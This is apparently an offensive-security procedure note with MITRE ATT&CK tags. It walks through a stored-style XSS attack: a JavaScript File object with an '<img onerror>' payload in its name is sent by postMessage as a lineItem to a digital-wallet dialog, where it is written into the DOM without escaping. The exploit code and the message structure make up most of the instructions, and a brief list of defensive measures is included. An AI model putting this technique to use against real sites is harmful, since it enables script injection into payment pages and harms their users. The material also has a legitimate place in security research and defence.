---
id: proc-craft-payload
tags:
  - payload-craft
  - file-object
  - xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/create-malicious-file]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.419Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-File-Object-Payload

## Summary

This procedure constructs a malicious File object with an XSS payload in its non-enumerable 'name' property, designed to bypass escaping when cloned via postMessage and inserted into the DOM as a lineItem.

## Description

Leverage the File constructor to embed HTML like <img src=xx: onerror=alert(document.domain)> in 'name', which skips escaping in u and gets templated into a table row via m, executing on load.

## Requirements

1. JS environment supporting File API
2. Valid postMessage structure from prior tests
3. Target endpoint loaded

## Defense

Defensive measures and detection strategies:

- Reject non-primitive payloads in postMessage.
- Deep-clone and escape all object properties explicitly.
- Audit for File/Blob usage in user data.

## Objectives

1. Create cloneable object with unescaped malicious 'name'.
2. Integrate into lineItems for DOM injection.
3. Ensure payload triggers onerror event.

## Instructions

### Step 1: Construct Malicious File

**Context**: Build File with empty content and XSS in name.

**Command** ([[commands/create-malicious-file]]):
```javascript
new File([""],"<img src=xx: onerror=alert(document.domain)>")
```

> Creates File; verify f.name contains payload, !hasOwnProperty('name').

### Step 2: Embed in Payload

**Context**: Wrap in postMessage payload as lineItems[0].

Use structure from tests: {type:"DigitalWalletsDialog:change", digitalWalletsDialog:true, payload:{title:"placeholder", button:"placeholder", lineItems:[maliciousFile]}}

> Payload ready for sending; 'name' will insert unescaped in <span> via m.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/create-malicious-file]]

## Tools Used


## Tags

- payload-craft
- xss
